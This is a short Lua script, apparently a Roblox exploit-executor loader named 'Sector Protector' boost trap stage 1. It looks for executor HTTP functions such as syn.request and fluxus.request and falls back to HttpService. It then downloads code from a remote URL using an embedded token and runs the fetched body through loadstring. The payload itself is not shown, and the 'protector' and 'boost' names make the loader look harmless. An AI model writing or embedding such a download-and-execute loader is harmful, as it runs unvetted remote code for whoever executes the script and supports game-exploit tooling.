-- Sector Protector :: boost trap stage 1
local _u="https://bestsecurity.lovable.app/api/public/raw/rKlOR62QKI?t=uFEZYrPKy9SxF0o8SBkOtQv5s7Iw6PGw&s=2"
local _tok="uFEZYrPKy9SxF0o8SBkOtQv5s7Iw6PGw"
local _h={["X-Sector-Boost"]=_tok,["User-Agent"]="SectorProtector/Boost"}
local _req=(syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request or http_request
local _body
if _req then
  local ok,res=pcall(_req,{Url=_u,Method="GET",Headers=_h})
  if ok and res and res.Body then _body=res.Body end
end
if not _body then
  local ok,res=pcall(function()
    local HttpService=game:GetService("HttpService")
    return HttpService:RequestAsync({Url=_u,Method="GET",Headers=_h}).Body
  end)
  if ok then _body=res end
end
if not _body then error("[Sector Protector] boost trap: no HTTP client available",0) end
_G.__SECTOR_WRAPPED=true
local _f=loadstring or load
local _c,_e=_f(_body)
if not _c then error("[Sector Protector] boost compile: "..tostring(_e),0) end
local _ok,_er=pcall(_c)
if not _ok then error("[Sector Protector] boost runtime: "..tostring(_er),0) end
